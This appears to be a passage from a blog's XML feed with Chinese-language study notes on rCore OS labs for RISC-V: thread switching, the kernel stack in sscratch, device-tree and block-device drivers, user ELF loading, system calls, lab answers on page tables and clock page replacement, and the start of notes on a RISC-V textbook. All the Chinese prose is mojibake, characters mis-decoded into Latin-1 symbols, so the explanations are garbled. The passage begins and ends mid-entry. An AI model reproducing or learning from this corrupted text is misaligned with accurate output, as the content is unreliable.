çº¿ç¨‹-å¤„äºç­‰å¾…çŠ¶æ€çš„ä¸€äº›çº¿ç¨‹</li></ul><p>å®ç°å…¨å±€çš„ï¼Œç”±<code>Lock</code>å°è£…çš„ç®¡ç†å™¨ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>Mutex</code>å’Œ <code>å…³é—­æ—¶é’Ÿä¸­æ–­</code>  ä¿è¯ä»–ä¸€ç›´åœ¨çº¿</p></li><li><p>é€šè¿‡è®¾ç½®<code>Context</code>è¿›è¡Œä¸€ä¸ªå°çš„å®éªŒï¼Œè¿›è¡ŒéªŒè¯å¹¶æ‰§è¡Œ</p><ul><li><code>mv sp a0</code>  ,  é€šè¿‡ <code>__restore</code> ä¼ å…¥ä¸€ä¸ªå‚æ•°-å³æˆ‘ä»¬ç²¾å¿ƒæ¶‰åŠçš„<code>Context</code></li><li>åŸæ¥æˆ‘ä»¬æ˜¯åœ¨å®éªŒä¸­ä¸ºäº†éªŒè¯ä¸­æ–­è€Œå¼€å¯äº†ä¸­æ–­ï¼Œç°åœ¨æˆ‘ä»¬å°†å…¶æ”¾åœ¨äº†çº¿ç¨‹å¼€å§‹æ—¶</li></ul></li><li><p><strong>ä¸­æ–­å¤„ç†</strong> ï¼š |   çº¿ç¨‹åˆ‡æ¢å®é™…ä¸ºæ—¶é’Ÿä¸­æ–­çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸­æ–­å¤„ç†æ—¶å®Œæˆåˆ‡æ¢</p><ul><li>å®šä¹‰çš„ç®¡ç†å™¨<code>PROCESSOR</code>å®Œæˆå½“å‰çº¿ç¨‹çš„ ä¸Šä¸‹æ–‡ çš„ä¿å­˜</li><li>ç®¡ç†å™¨ä¸ºæˆ‘ä»¬åˆ†é…ä¸‹ä¸€ä¸ªåº”è¯¥è°ƒç”¨çš„è¿›ç¨‹ï¼Œå¹¶å°†ä»–çš„ä¸Šä¸‹æ–‡è¿”å› é€šè¿‡ <code>__restore</code> è½¬æ¢<ul><li> å¦‚æœæ²¡æœ‰ä¸‹ä¸€ä¸ªçº¿ç¨‹ï¼Œåˆ™å¯åŠ¨ä¼‘çœ çº¿ç¨‹ï¼Œéƒ½æ²¡æœ‰åˆ™é€€å‡º</li></ul></li></ul></li><li><p><strong>çº¿ç¨‹çš„ç»“æŸï¼š</strong>| é€šè¿‡è®¾ç½® <code>ra</code> æ—¶çº¿ç¨‹é¡ºåˆ©ç»“æŸ </p><ul><li>åŸæ¥çº¿ç¨‹ç»“æŸè§¦å‘<code>Exception::InstructionPageFault</code>  ï¼Œè·³è½¬ <code>0x0</code></li><li>é€šè¿‡è§¦å‘ä¸­æ–­ï¼Œé€šçŸ¥æ“ä½œç³»ç»Ÿè¿›è¡Œé‡Šæ”¾ï¼Œ<code>ecall</code> è°ƒç”¨ <code>ebreak</code></li><li>å°†ä¸­æ–­åŒ…è£…åœ¨ç»“æŸå‡½æ•°ä¸­ï¼Œæ ‡è®°çº¿ç¨‹ç»“æŸï¼Œå¹¶è®¾ç½®çº¿ç¨‹ç»“æŸçš„ <code>ra</code></li></ul></li><li><p><strong>å†…æ ¸æ ˆï¼š</strong> | ä½†å‘ç”Ÿä¸­æ–­æ—¶ï¼Œä¼šåˆ‡æ¢åˆ°å†…æ ¸æ€ï¼ŒåŸæ¥ç”¨äºå¤„ç†ä¸­æ–­çš„<code>sp</code>æŒ‡é’ˆéœ€è¦ä¸€ä¸ªå†…æ ¸æ ˆï¼Œä¸“é—¨ç”¨äºåœ¨å†…æ ¸æ€æ‰§è¡Œå‡½æ•° - é˜²æ­¢çº¿ç¨‹çš„å´©æºƒå¯¼è‡´æ“ä½œç³»ç»Ÿçš„å´©æºƒ</p><ul><li><p>åªéœ€è¦ä¸€ä¸ªå†…æ ¸æ ˆï¼Œå› ä¸ºåªæœ‰ä¸­æ–­æ—¶ä½¿ç”¨å†…æ ¸æ ˆï¼Œè€Œä¸ä¼šæœ‰ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶ä¸­æ–­</p></li><li><p>å†…æ ¸æ ˆçš„åœ°å€ä¸èƒ½æ”¾åœ¨é€šç”¨å¯„å­˜å™¨ä¸­ï¼Œè€Œ<code>sscratch</code>åªæœ‰å†…æ ¸æ€èƒ½è®¿é—®ï¼Œæ¯”è¾ƒåˆé€‚</p></li><li><p>å®é™…çš„åšæ³•: å®šä¹‰<code>kernel_stack</code>åˆ†é…ç©ºé—´ï¼Œ<code>interrupt.asm</code>ä¸­å¯¹<code>sscratch</code>æ“ä½œ</p><ul><li>ä¸ºå†…æ ¸æ ˆåˆ†é…ä¸€æ®µç©ºé—´</li><li>è¿è¡Œçº¿ç¨‹æ—¶ï¼Œå°†å†…æ ¸æ ˆæŒ‡é’ˆä¿å­˜åœ¨<code>sscratch</code>å¯„å­˜å™¨ä¸­</li><li>ä¸­æ–­æ—¶ï¼Œåˆ™ä»å°† <code>Context</code> å‹å…¥ <code>sscratch</code> æŒ‡å‘çš„æ ˆä¸­ï¼ˆ<code>Context</code> çš„åœ°å€ä¸º <code>sscratch - size_of::&lt;Context&gt;()</code>ï¼‰ï¼ŒåŒæ—¶ç”¨æ–°çš„æ ˆåœ°å€æ¥æ›¿æ¢ <code>sp</code>ï¼ˆæ­¤æ—¶ <code>sp</code> ä¹Ÿä¼šè¢«å¤åˆ¶åˆ° <code>a0</code> ä½œä¸º <code>handle_interrupt</code> çš„å‚æ•°ï¼‰</li><li>ä»ä¸­æ–­ä¸­è¿”å›æ—¶ï¼ˆ<code>__restore</code> æ—¶ï¼‰ï¼Œ<code>a0</code> åº”æŒ‡å‘**è¢«å‹åœ¨å†…æ ¸æ ˆä¸­çš„ <code>Context</code>**ã€‚æ­¤æ—¶å‡ºæ ˆ <code>Context</code> å¹¶ä¸”å°†æ ˆé¡¶ä¿å­˜åˆ° <code>sscratch</code> ä¸­</li></ul><p> è¿è¡Œæ—¶å¦‚ä½• å°†å†…æ ¸æ ˆæŒ‡é’ˆä¿å­˜åœ¨<code>sscratch</code>ä¸­?</p></li></ul></li></ol><img src="https://github.com/dingiso/DailySchedule/blob/master/img/sscratch.png" alt="sscratch"><h2 id="lab-5"><a href="#lab-5" class="headerlink" title="lab-5"></a>lab-5</h2><ol><li><p>ä¸èƒ½ä¸€ç›´è¿è¡Œå†…æ ¸ ï¼Œæˆ‘ä»¬è¦å®ç°æŠŠè¯»å–å­˜å‚¨è®¾å¤‡çš„æ•°æ®ï¼Œ<strong>OpenSBI</strong> è¿›è¡Œæ‰«æå¹¶è®¾å¤‡é€šè¿‡<strong>MMIO</strong>æ˜ å°„åˆ°ç‰©ç†å†…å­˜çš„ä¸€å—äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨rust_main ä¸­æ·»åŠ å‚æ•°ï¼ŒOpenSBI å°±ä¼šå‘Šè¯‰æˆ‘ä»¬æ˜ å°„çš„åœ°å€</p><ul><li><p><code>_hart_id</code>:  0,</p><p><code>dtb_pa</code>:  PhysicalAddress(0x82200000)</p></li></ul></li><li><p> é€šè¿‡è°ƒç”¨ rcore ä¸­çš„ å±æ€§è§£æ<code>device_tree</code>åº“ï¼Œæˆ‘ä»¬å¾—åˆ°çš„ä¾¿æ˜¯ä¸€ä¸ª å»ºå¥½çš„æ ‘  - <strong>è®¾å¤‡æ ‘</strong></p></li></ol><ul><li>é€šè¿‡ é€’å½’ ä»æ ¹èŠ‚ç‚¹è¿›è¡Œé€’å½’ ï¼Œå‘ç°æ”¯æŒ <code>&quot;virtio,mmio&quot;</code> ï¼Œ å°±å¯ä»¥åŠ è½½ä»–çš„é©±åŠ¨</li><li>åˆå§‹åŒ–è®¾å¤‡ æ—¶éœ€è¦è¿›è¡ŒéªŒè¯<code>Magic Number</code> ï¼Œ ç¡®å®šå…¶ä¸ºè®¾å¤‡æ ‘</li></ul><ol start="3"><li><p>è¿›ä¸€æ­¥å¯¹èŠ‚ç‚¹è¿›è¡Œåˆ¤æ–­ï¼Œ åªè¯»å–å…¶ä¸­çš„ <code>Block</code> å—è®¾å¤‡</p><ul><li>ç²’åº¦ ä¸º æ•´<strong>å—</strong>ï¼Œä»¥å—ä¸ºå•ä½è¯»å†™ï¼Œï¼ˆç±»æ¯”ç¡¬ç›˜ï¼‰</li></ul></li><li><p>å®ç°ä¸º <code>DMA</code> åˆ†é…ç‰©ç†é¡µçš„å®šä¹‰å’Œæ“ä½œ åŒ…æ‹¬ <strong>ç‰©ç†åœ°å€-è™šæ‹Ÿåœ°å€çš„è½¬æ¢</strong>ï¼Œ <strong>åˆ†é…å’Œå»é…æ“ä½œ</strong></p></li><li><p>æŠ½è±¡è®¾å¤‡ é©±åŠ¨çš„æ¥å£ ï¼Œç®€å•çš„ä¸‰ç§æ–¹æ³• ï¼š</p><ul><li>è¯»å–è®¾å¤‡ä¿¡æ¯</li><li>å—è®¾å¤‡æ¥å£<ul><li>è¯»å–æŸä¸ªå— åˆ° buffer ä¸­ï¼Œ å®ç°å¯¹æ•°æ®çš„è¯»å–</li><li>å°† buffer çš„æ•°æ® å†™å…¥ æŸä¸ªå—ï¼Œ å®ç°å†™æ•°æ®</li></ul></li></ul></li><li><p>å¯¹å—è®¾å¤‡çš„æŠ½è±¡ï¼ŒåŸºæœ¬ä¸ºå®ç°ä¸Šè¿° çš„ ä¸‰ä¸ªæ¥å£ã€‚</p></li></ol>  <img src="https://github.com/dingiso/DailySchedule/blob/master/img/design.png" alt="design"><ol start="7"><li> æ–‡ä»¶ç³»ç»Ÿ åˆ©ç”¨ rcore-fs é€šè¿‡æŸ¥æ‰¾å…¨éƒ¨è®¾å¤‡é©±åŠ¨ä¸­çš„ç¬¬ä¸€ä¸ªå­˜å‚¨è®¾å¤‡ä½œä¸ºæ ¹ç›®å½•ã€‚</li><li>åŒæ—¶è°ƒç”¨<code>BlockCache::new()</code> ä½¿å¾—è®¾å¤‡åœ¨å†…å­˜ä¸­å…·æœ‰<code>cache</code></li><li>æœ€å é€šè¿‡ è°ƒç”¨ ä»¥å®ç°çš„æ¥å£ä¸­çš„ <code>ls</code> è¿›è¡Œ æ–‡ä»¶åçš„è¾“å‡º</li></ol><h2 id="lab-6"><a href="#lab-6" class="headerlink" title="lab-6"></a>lab-6</h2><ol><li><p>å»ºç«‹ <code>user</code> crateï¼Œä½œä¸ºç”¨æˆ·ç¨‹åºçš„æ”¾ç½®ä½ç½® - å¹¶ä¸ºå…¶å»é™¤ä¾èµ–</p></li><li><p>é€šè¿‡ <code>rcore-fs-fuse</code> å°†æˆ‘ä»¬çš„ç”¨æˆ·ç¨‹åºç¼–è¯‘æ‰“åŒ…ä¸º <strong>ELF</strong> æ–‡ä»¶-è½¬æ¢ä¸º <strong>QCOW_FILE</strong> æ ¼å¼</p></li><li><p>åˆ©ç”¨ <code>xmas_elf</code> è§£æå™¨å°† ELF æ–‡ä»¶è¯»åˆ°å†…å­˜ä¸­ï¼Œè§£æå­—æ®µï¼Œå»ºç«‹<strong>å†…æ ¸æ˜ å°„</strong>ï¼ˆèƒ½ä¸­æ–­ï¼‰</p></li><li><p>ä¿®æ”¹<code>Mapping::map</code> å‡½æ•° ï¼Œ å¢åŠ  <code>init_data</code>å‚æ•°ä¸ºåˆå§‹åŒ–æ•°æ®</p><ul><li>åŠ¨æ€åˆ†é…å†…å­˜ - åˆ†é…çš„ä¸ä¸€å®šè¿ç»­ - åˆ©ç”¨<strong>å¸§åˆ†</strong>é…çš„æ–¹å¼</li><li>è€ƒè™‘ å¦‚æœæœ€åå‰©ä¸‹çš„æ•°æ®ä¸æ»¡è¶³ä¸€é¡µçš„æƒ…å†µ</li><li>åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œ å¯¹ <code>.bss</code> æ®µè¿›è¡Œåˆå§‹åŒ–</li></ul></li><li><p>åˆ©ç”¨æ±‡ç¼–å‚æ•°çš„ä¼ é€’ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œä»ç›¸åº”çš„å¯„å­˜å™¨ä¸­å–å‡ºè°ƒç”¨ä»£å·å’Œå‚æ•°ï¼Œæ ¹æ®è°ƒç”¨ä»£å·ï¼Œè¿›å…¥ä¸åŒçš„å¤„ç†æµç¨‹ï¼Œå¾—åˆ°å¤„ç†ç»“æœ</p><ul><li><p>å›æ•°å€¼å¹¶ç»§ç»­æ‰§è¡Œï¼š</p><ul><li>è¿”å›å€¼å­˜æ”¾åœ¨ <code>x10</code> å¯„å­˜å™¨ï¼Œ<code>sepc += 4</code>ï¼Œç»§ç»­æ­¤ <code>context</code> çš„æ‰§è¡Œ</li></ul></li><li><p>ç¨‹åºè¿›å…¥ç­‰å¾…</p><ul><li>åŒæ ·éœ€è¦æ›´æ–° <code>x10</code> å’Œ <code>sepc</code>ï¼Œä½†æ˜¯éœ€è¦å°†å½“å‰çº¿ç¨‹æ ‡è®°ä¸ºç­‰å¾…ï¼Œåˆ‡æ¢å…¶ä»–çº¿ç¨‹æ¥æ‰§è¡Œ</li></ul></li><li><p>ç¨‹åºç»ˆæ­¢</p><ul><li>ä¸éœ€è¦è€ƒè™‘ç³»ç»Ÿè°ƒç”¨çš„è¿”å›ï¼Œç›´æ¥åˆ é™¤çº¿ç¨‹</li></ul></li></ul></li><li><p>ç¼–å†™æ–‡ä»¶çš„è¾“å…¥è¾“å‡ºæµ <code>stdin</code> <code>stdout</code></p></li><li><p>å®ç°æ¡ä»¶å˜é‡ï¼Œæ›¿ä»£åŸæ¥çš„é˜»å¡å¼ï¼Œå¢åŠ å¤„ç†å™¨åˆ©ç”¨ç‡ï¼Œå¢å¼ºäº¤äº’æ€§</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCoreå®éªŒå››æ€»ç»“</title>
      <link href="/2020/07/25/%E5%AE%9E%E9%AA%8C%E5%9B%9B/"/>
      <url>/2020/07/25/%E5%AE%9E%E9%AA%8C%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>å®éªŒå››çš„åˆ†æåŠè§£ç­”</p><a id="more"></a><h1 id="å®éªŒå››"><a href="#å®éªŒå››" class="headerlink" title="å®éªŒå››"></a>å®éªŒå››</h1><ol><li><p>åŸç†ï¼šçº¿ç¨‹åˆ‡æ¢ä¹‹ä¸­ï¼Œé¡µè¡¨æ˜¯ä½•æ—¶åˆ‡æ¢çš„ï¼Ÿé¡µè¡¨çš„åˆ‡æ¢ä¼šä¸ä¼šå½±å“ç¨‹åº / æ“ä½œç³»ç»Ÿçš„è¿è¡Œï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</p><p>1ï¼‰çº¿ç¨‹ç»“æŸæ—¶ï¼Œra ç»“æŸå‡½æ•°è§¦å‘æ—¶é’Ÿä¸­æ–­ï¼Œä¸­æ–­å¤„ç†å‡½æ•°è°ƒç”¨ <code>prepare_next_thread()</code> , åœ¨å®é™…è°ƒç”¨ <code>next_thread.prepare()</code>  æœ€åé€šè¿‡ <code>activate()</code> æ¿€æ´»é¡µè¡¨ï¼Œè¿›è¡Œé¡µè¡¨çš„åˆ‡æ¢</p><p>2ï¼‰ä¸ä¼šå½±å“è¿è¡Œï¼Œé¡µè¡¨åˆ‡æ¢å‘ç”Ÿåœ¨ä¸­æ–­æœŸé—´ï¼Œæ“ä½œç³»ç»Ÿè¿è¡Œä¸­ï¼Œæˆ‘ä»¬è®¾ç«‹äº†å†…æ ¸æ ˆï¼Œä¸­æ–­æœŸé—´è°ƒç”¨çš„ï¼Œä¸€ç›´å­˜åœ¨ã€‚</p></li><li><p>è®¾è®¡ï¼šå¦‚æœä¸ä½¿ç”¨ <code>sscratch</code> æä¾›å†…æ ¸æ ˆï¼Œè€Œæ˜¯åƒåŸæ¥ä¸€æ ·ï¼Œé‡åˆ°ä¸­æ–­å°±ç›´æ¥å°†ä¸Šä¸‹æ–‡å‹æ ˆï¼Œè¯·ä¸¾å‡ºï¼ˆæ€è·¯å³å¯ï¼Œæ— éœ€ä»£ç ï¼‰ï¼š</p><ul><li>ä¸€ç§æƒ…å†µä¸ä¼šå‡ºç°é—®é¢˜    - ä¸æ“ä½œ sp </li><li>ä¸€ç§æƒ…å†µå¯¼è‡´å¼‚å¸¸æ— æ³•å¤„ç†ï¼ˆæŒ‡æ— æ³•è¿›å…¥ <code>handle_interrupt</code>ï¼‰- ä¸ä¿å­˜ sp å¯„å­˜å™¨</li><li>ä¸€ç§æƒ…å†µå¯¼è‡´äº§ç”ŸåµŒå¥—å¼‚å¸¸ï¼ˆæŒ‡ç¬¬äºŒä¸ªå¼‚å¸¸èƒ½å¤Ÿè¿›è¡Œåˆ°è°ƒç”¨ <code>handle_interrupt</code>ï¼Œä¸è€ƒè™‘åç»­æ‰§è¡Œæƒ…å†µï¼‰ - è¿è¡Œä¸¤ä¸ªçº¿ç¨‹ã€‚åœ¨ä¸¤ä¸ªçº¿ç¨‹åˆ‡æ¢çš„æ—¶å€™ï¼Œä¼šéœ€è¦åˆ‡æ¢é¡µè¡¨ã€‚ä½†æ˜¯æ­¤æ—¶æ“ä½œç³»ç»Ÿè¿è¡Œåœ¨å‰ä¸€ä¸ªçº¿ç¨‹çš„æ ˆä¸Šï¼Œä¸€æ—¦åˆ‡æ¢ï¼Œå†è®¿é—®æ ˆå°±ä¼šå¯¼è‡´ç¼ºé¡µï¼Œå› ä¸ºæ¯ä¸ªçº¿ç¨‹çš„æ ˆåªåœ¨è‡ªå·±çš„é¡µè¡¨ä¸­</li><li>ä¸€ç§æƒ…å†µå¯¼è‡´ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ï¼ˆå…ˆä¸è€ƒè™‘æ˜¯æ€ä¹ˆæ¥çš„ï¼‰å¯ä»¥å°†è‡ªå·±å˜ä¸ºå†…æ ¸è¿›ç¨‹ï¼Œæˆ–ä»¥å†…æ ¸æ€æ‰§è¡Œè‡ªå·±çš„ä»£ç  -  é€šè¿‡ æ”¹å˜ sp çš„å­˜å‚¨ä½ç½®ï¼Œ ä½¿å¾—ç”¨æˆ·è¿›ç¨‹æœ‰èƒ½åŠ›è®¿é—®å¹¶ä¿®æ”¹åˆ°</li></ul></li><li><p>å®éªŒï¼šå½“é”®ç›˜æŒ‰ä¸‹ Ctrl + C æ—¶ï¼Œæ“ä½œç³»ç»Ÿåº”è¯¥èƒ½å¤Ÿæ•æ‰åˆ°ä¸­æ–­ã€‚å®ç°æ“ä½œç³»ç»Ÿæ•è·è¯¥ä¿¡å·å¹¶ç»“æŸå½“å‰è¿è¡Œçš„çº¿ç¨‹ï¼ˆä½ å¯èƒ½éœ€è¦é˜…è¯»ä¸€ç‚¹åœ¨å®éªŒæŒ‡å¯¼ä¸­æ²¡æœ‰æåˆ°çš„ä»£ç ï¼‰</p><p><a href="https://github.com/dingiso/DailySchedule/blob/master/code/%E5%AE%9E%E9%AA%8C%E5%9B%9B/handler.rs">handler.rs</a></p><p> é€šè¿‡å¼€å¯å¤–éƒ¨ä¸­æ–­çš„æ–¹æ³•ï¼Œ å€ŸåŠ© sbi è°ƒç”¨å‡½æ•°ï¼Œæ•æ‰é”®ç›˜å¯¼è‡´çš„å¤–éƒ¨ä¸­æ–­ï¼Œå…ˆåœ¨  ä¸­æ–­å¤„ç†æ—¶æ‰“å° ctrl+c çš„ sbi è°ƒç”¨è¿”å›å€¼ï¼Œä¸º3 ï¼Œåˆ¤æ–­å…¶ä¸º 3 åˆ™ <code>kill_current_thread</code></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCoreå®éªŒä¸‰æ€»ç»“</title>
      <link href="/2020/07/25/%E5%AE%9E%E9%AA%8C%E4%B8%89/"/>
      <url>/2020/07/25/%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p>å®éªŒä¸‰çš„åˆ†æåŠè§£ç­”</p><a id="more"></a><h1 id="å®éªŒä¸‰"><a href="#å®éªŒä¸‰" class="headerlink" title="å®éªŒä¸‰"></a>å®éªŒä¸‰</h1><ol><li><p>åŸç†ï¼šåœ¨ <code>os/src/entry.asm</code> ä¸­ï¼Œ<code>boot_page_table</code> çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿå½“è·³è½¬æ‰§è¡Œ <code>rust_main</code> æ—¶ï¼Œä¸è€ƒè™‘ç¼“å­˜ï¼Œç¡¬ä»¶é€šè¿‡å“ªäº›åœ°å€æ‰¾åˆ°äº† <code>rust_main</code> çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Ÿ</p><p>1ï¼‰ å› ä¸ºæˆ‘ä»¬å°†å†…æ ¸ç»Ÿä¸€ä½¿ç”¨è™šæ‹Ÿåœ°å€ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªåˆå§‹çš„é¡µè¡¨è¿›è¡Œæ˜ å°„ï¼Œä¹Ÿå°±æ˜¯é¢˜ä¸­æ‰€è¯´çš„<code>boot_page_table</code>ï¼Œ å› ä¸ºä»–çš„asw ä¸å…¨ä¸º0 ï¼Œ å®ƒåŒ…å«äº† ä¸¤ä¸ª 1GB å¤§é¡µ åˆ†åˆ«è¡¨ç¤ºæ˜ å°„</p><table><thead><tr><th>è™šæ‹Ÿåœ°å€</th><th>ç‰©ç†åœ°å€</th></tr></thead><tbody><tr><td>0x8000_0000 - 0xC000_0000</td><td>0x8000_0000 - 0xC000_0000</td></tr><tr><td>0xffff_ffff_8000_0000-0xffff_ffff_c000_0000</td><td>0x8000_0000 - 0xc000_0000</td></tr></tbody></table><p>ç¬¬äºŒé¡¹ ä¸º  æˆ‘ä»¬ä»¥åå°†è¦ä½¿ç”¨çš„è™šæ‹Ÿåœ°å€ ä¸ ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„</p><p>ç¬¬ä¸€é¡¹ æ˜¯å› ä¸ºæˆ‘ä»¬ åœ¨ æ›¿æ¢é¡µè¡¨åï¼Œpc ä»ä¸ä¼šæ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦å…ˆè¡Œåˆ©ç”¨è¿™ä¸ªç»§ç»­è¿è¡Œï¼Œå¸¦pcæ”¹å˜åï¼Œæ”¹ä¸º ç¬¬äºŒä¸ªæ˜ å°„</p><p>2ï¼‰å…ˆä» satp é«˜ä½è¯»å–å†…å­˜çš„æ˜ å°„æ–¹å¼ï¼Œä½ä½è¯»å– <code>boot_page_table</code> çš„ç‰©ç†é¡µå·ï¼Œ</p><p>è¯»å– VPN3 ã€30ï¼š38ã€‘  <code>0xff</code> ä¸º  <code>111111110</code>  ä¸º 510 å®šä½åˆ° 510é¡¹ï¼Œ åˆ¤æ–­é¡µè¡¨é¡¹å¾—çŸ¥ä¸ºå¤§é¡µ</p><p>ä»è¡¨ä¸­çŸ¥é“ç‰©ç†é¡µåŸºå€ä¸º 0x8000_0000 åŠ ä¸Šï¼Œé¡µå†…åç§»é‡ï¼Œæ‰¾åˆ°äº† <code>rust_main()</code> çš„åœ°å€</p></li><li><p>åˆ†æï¼šä¸ºä»€ä¹ˆ <code>Mapping</code> ä¸­çš„ <code>page_tables</code> å’Œ <code>mapped_pairs</code> éƒ½ä¿å­˜äº†ä¸€äº› <code>FrameTracker</code>ï¼ŸäºŒè€…æœ‰ä½•ä¸åŒï¼Ÿ</p><p>page_tables   å­˜æ”¾é¡µè¡¨ä¼šç”¨åˆ°çš„é¡µé¢</p><p>mapped_pairs å­˜æ”¾æ‰€æœ‰æ˜ å°„è¿‡çš„é¡µé¢ï¼Œ è¿›ç¨‹ç”¨åˆ°çš„é¡µé¢</p></li><li><p>åˆ†æï¼šå‡è®¾æŸè¿›ç¨‹éœ€è¦è™šæ‹Ÿåœ°å€ A åˆ°ç‰©ç†åœ°å€ B çš„æ˜ å°„ï¼Œè¿™éœ€è¦æ“ä½œç³»ç»Ÿæ¥å®Œæˆã€‚é‚£ä¹ˆæ“ä½œç³»ç»Ÿåœ¨å»ºç«‹æ˜ å°„æ—¶æœ‰æ²¡æœ‰è®¿é—® Bï¼Ÿå¦‚æœæœ‰ï¼Œå®ƒæ˜¯æ€ä¹ˆåœ¨è¿˜æ²¡æœ‰æ˜ å°„çš„æƒ…å†µä¸‹è®¿é—® B çš„å‘¢ï¼Ÿ</p><p>æ²¡æœ‰è®¿é—®Bï¼Œæˆ‘ä»¬éœ€è¦ç”³è¯·å»ºç«‹é¡µè¡¨æ—¶ï¼Œä¼šå¾—åˆ° B çš„ç‰©ç†åœ°å€ï¼Œä½†ç‰¹æ®Šæƒ…å†µï¼Œ å¦‚æœBæ˜¯å†…æ ¸åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡çº¿æ€§åç§»é‡è¿›è¡Œè®¿é—®ã€‚</p></li><li><p><strong>å®éªŒæ¡†æ¶å°šæœªå‡†å¤‡å®Œå–„ï¼‰</strong>å®éªŒï¼šäº†è§£å¹¶å®ç°æ—¶é’Ÿé¡µé¢ç½®æ¢ç®—æ³•ï¼ˆæˆ–ä»»ä½•ä½ æ„Ÿå…´è¶£çš„ç®—æ³•ï¼‰ï¼Œå¯ä»¥è‡ªè¡Œè®¾è®¡æ ·ä¾‹æ¥æ¯”è¾ƒæ€§èƒ½</p><ul><li><p>ç½®æ¢ç®—æ³•åªéœ€è¦ä¿®æ”¹ <code>os/src/memory/mapping/swapper.rs</code>ï¼Œä½ å¯èƒ½éœ€è¦åœ¨å…¶ä¸­è®¿é—®é¡µè¡¨é¡¹</p></li><li><p><a href="https://github.com/dingiso/DailySchedule/blob/master/code/%E5%AE%9E%E9%AA%8C%E4%B8%89/swapper.rs">swapper.rs</a> </p></li><li><p>åœ¨ <code>main.rs</code> ä¸­è°ƒç”¨ <code>start_kernel_thread</code> æ¥åˆ›å»ºçº¿ç¨‹ï¼Œä½ å¯ä»¥ä»»æ„ä¿®æ”¹å…¶ä¸­è¿è¡Œçš„å‡½æ•°ï¼Œä»¥è¾¾åˆ°æµ‹è¯•æ•ˆæœ</p><p>ä¸ºç¡®ä¿<code>PageTableEntry</code> å®‰å…¨ä¼ è¾“ - ä¸ºæ—¶é’Ÿswapper å®ç° send æ¥å£</p><p>åœ¨pop çš„æ—¶å€™ï¼Œå¦‚æœè¯¥é¡µè¡¨é¡¹<code>PageTableEntry</code> ä»¥è®¿é—®ï¼ˆACCESS=1ï¼‰ æˆ–è€… å·²ä¿®æ”¹ ï¼ˆDIRTY=1ï¼‰ å°±å°†å…¶ç½®é›¶</p><p>å¦åˆ™ï¼Œ å°±å°†å…¶æ›¿æ¢æ‰</p></li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ-RISC-V</title>
      <link href="/2020/07/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E8%AE%BE%E8%AE%A1RISC-V/"/>
      <url>/2020/07/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E8%AE%BE%E8%AE%A1RISC-V/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯åœ¨é˜…è¯»ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ-RISC-V ã€‹åå†™çš„ï¼Œä¸»è¦é’ˆå¯¹risc-væ¶æ„çš„å†…å®¹çš„é˜è¿°</p><a id="more"></a><h1 id="è®¡ç®—æœºç»„æˆä¸è®¾è®¡RISC-V"><a href="#è®¡ç®—æœºç»„æˆä¸è®¾è®¡RISC-V" class="headerlink" title="è®¡ç®—æœºç»„æˆä¸è®¾è®¡RISC-V"></a>è®¡ç®—æœºç»„æˆä¸è®¾è®¡RISC-V</h1><h2 id="Chapter1-Computer-Abstractions-and-Technology"><a href="#Chapter1-Computer-Abstractions-and-Technology" class="headerlink" title="Chapter1 Computer Abstractions and Technology"></a>Chapter1 Computer Abstractions and Technology</h2><h3 id="1-1-Intorduction"><a href="#1-1-Intorduction" class="headerlink" title="1.1 Intorduction"></a>1.1 Intorduction</h3><p>è®¡ç®—æœºåº”ç”¨ä¸»è¦åˆ†<strong>ä¸‰</strong>ä¸ªé¢†åŸŸ ï¼š PC ï¼Œ æœåŠ¡å™¨ ï¼ŒåµŒå…¥å¼</p><p>åœ¨ç°åœ¨æ—¶ä»£ PC å·²ç»é€æ¸è¢« PMDï¼ˆPersonal Mobile Deviceï¼‰ æ‰€å–ä»£</p><p>æœ¬ä¹¦æ¶‰çŒçš„å†…å®¹</p><blockquote><p>é«˜çº§è¯­è¨€å¦‚ä½•è½¬ä¸ºæœºå™¨è¯­è¨€ï¼Œç¡¬ä»¶å¦‚ä½•æ‰§è¡Œç¨‹åºï¼›</p><p>è½¯ç¡¬ä»¶æ¥å£æ˜¯ä»€ä¹ˆï¼Œè½¯ä»¶å¦‚ä½•è®©ç¡¬ä»¶æ‰§è¡Œç‰¹å®šåŠŸèƒ½ï¼›</p><p>ä»€ä¹ˆå†³å®šäº†ç¨‹åºçš„æ€§èƒ½ï¼Œæ€ä¹ˆæé«˜æ€§èƒ½ï¼Œé™ä½èƒ½è€—ï¼›</p><p>å¹¶è¡Œè®¡ç®—çš„åŸå› 